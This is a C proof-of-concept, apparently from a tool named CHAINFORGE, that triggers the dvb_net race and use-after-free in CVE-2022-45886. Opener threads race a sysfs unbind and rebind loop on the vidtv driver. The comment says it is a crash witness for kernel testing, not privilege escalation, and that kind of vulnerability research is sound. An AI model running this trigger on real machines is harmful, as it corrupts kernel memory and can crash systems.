/*
 * CHAINFORGE KASAN crash-trigger for CVE-2022-45886 (CWE-362 race -> CWE-416 UAF, dvb_net).
 * Race: dvb_net_open() vs dvb_net_release() during device teardown. dvb_net_release() does
 * wait_event() on dvbdev->wait_queue; an open() racing the teardown reads the freed dvb_net /
 * fops. Reaches the bug through vidtv's net0 node; teardown driven by sysfs unbind. NOT an
 * exploit (no privesc). KASAN UAF in the dvb_net path = the witness for THIS CVE specifically.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* CVE-2022-45886 lives in the dvb_net node specifically. */
#define TARGET "/dev/dvb/adapter0/net0"
static volatile int stop_open = 0;

static void *opener(void *arg) {
    (void)arg;
    while (!stop_open) {
        int fd = open(TARGET, O_RDWR | O_NONBLOCK);
        if (fd >= 0) close(fd);
    }
    return NULL;
}

static int write_str(const char *path, const char *val) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return n < 0 ? -1 : 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    const char *UNBIND = "/sys/bus/platform/drivers/vidtv/unbind";
    const char *BIND = "/sys/bus/platform/drivers/vidtv/bind";
    const char *DEV = "vidtv.0";
    for (int i = 0; i < 20 && access(TARGET, F_OK) != 0; i++) usleep(100000);
    if (access(TARGET, F_OK) != 0) printf("[cf] warning: %s absent\n", TARGET);

    pthread_t a, b, c;
    pthread_create(&a, NULL, opener, NULL);
    pthread_create(&b, NULL, opener, NULL);
    pthread_create(&c, NULL, opener, NULL);

    const int rounds = 4000;
    for (int i = 0; i < rounds; i++) {
        if (write_str(UNBIND, DEV) != 0) {
            system("/bin/busybox rmmod vidtv 2>/dev/null");
            system("/bin/busybox modprobe vidtv 2>/dev/null");
        } else {
            usleep(150);
            write_str(BIND, DEV);
        }
        if ((i & 0xff) == 0) printf("[cf] net teardown round %d/%d\n", i, rounds);
    }
    stop_open = 1;
    pthread_join(a, NULL);
    pthread_join(b, NULL);
    pthread_join(c, NULL);
    printf("[cf] done %d rounds (no KASAN splat this run)\n", rounds);
    return 0;
}
